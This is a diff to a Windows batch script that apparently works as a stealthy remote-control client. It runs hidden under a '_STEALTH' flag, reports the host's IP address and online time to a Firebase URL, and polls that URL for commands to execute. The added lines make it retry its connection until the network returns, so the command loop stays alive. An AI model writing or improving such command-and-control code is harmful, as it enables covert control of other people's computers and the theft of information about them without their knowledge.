@@ -8,6 +8,16 @@ if not defined _STEALTH (
     exit /b
 )
 
+:: Function to check internet connection
+:check_connection
+echo [%TIME%] Checking network connection...
+ping -n 1 8.8.8.8 >nul 2>&1
+if %errorlevel% neq 0 (
+    echo [%TIME%] No network connection. Waiting to retry...
+    timeout /t 10 /nobreak >nul
+    goto check_connection
+)
+
 :: Configuration
 :: Read FIREBASE_URL from config.txt
 set FIREBASE_URL=
@@ -32,6 +42,14 @@ curl -X PATCH -d "{\"ip\":\"%IP_ADDRESS%\", \"last_online\":\"%DATE% %TIME%\"}" 
 
 :: Command processing loop
 :loop
+:: Check connection before each iteration
+ping -n 1 8.8.8.8 >nul 2>&1
+if %errorlevel% neq 0 (
+    echo [%TIME%] Connection lost. Waiting to reconnect...
+    timeout /t 10 /nobreak >nul
+    goto check_connection
+)
+
 echo [%TIME%] Checking for commands...
 curl -s "%FIREBASE_URL%%COMMAND_PATH%/command.json" > current_command.txt
 
